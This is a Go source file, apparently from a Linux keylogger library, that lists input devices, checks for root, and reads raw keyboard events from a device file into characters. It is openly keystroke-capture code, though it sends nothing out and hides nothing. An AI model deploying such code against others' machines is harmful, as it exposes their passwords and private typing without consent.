package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
)

var ret chanInputEvent

func NewDevices() ([]*InputDevice, error) {

	var ret []*InputDevice
	for i := 0; i < MAX_FILES; i++ {
		buff, err := ioutil.ReadFile(fmt.Sprintf(INPUTS, i))
		if err != nil {
			break
		}
		ret = append(ret, newInputDeviceReader(buff, i))
	}
	return ret, nil
}

func newInputDeviceReader(buff []byte, id int) *InputDevice {
	rd := bufio.NewReader(bytes.NewReader(buff))
	rd.ReadLine()
	dev, _, _ := rd.ReadLine()
	name := strings.Split(string(dev), "=")

	return &InputDevice{
		Id:   id,
		Name: name[1],
	}
}

func NewKeyLogger(dev *InputDevice) *KeyLogger {
	return &KeyLogger{
		dev: dev,
	}
}

func (t *KeyLogger) Read() error {

	ret = make(chanInputEvent, 512)
	if err := checkRoot(); err != nil {
		close(ret)
		return err
	}

	fd, err := os.Open(fmt.Sprintf(DEVICE_FILE, t.dev.Id))
	if err != nil {
		close(ret)
		return fmt.Errorf("Error opening device file: %s ", err.Error())
	}
	go func() {
		for {
			tmp := make([]byte, eventsize)
			event := InputEvent{}
			n, err := fd.Read(tmp)
			if err != nil {
				close(ret)
				log.Fatal(err)
			}
			if n <= 0 {
				continue
			}
			err = binary.Read(bytes.NewBuffer(tmp), binary.LittleEndian, &event)
			if err != nil {
				close(ret)
				log.Fatal(err)
			}
			ret <- event
		}
	}()
	return nil
}

func (t *InputEvent) KeyString(shift,caps bool) string {
	if shift {
		return keyCodeMapShift[t.Code]
	} else if caps {
		return keyCodeMapCaps[t.Code]
	} else {
		return keyCodeMap[t.Code]
	}
}

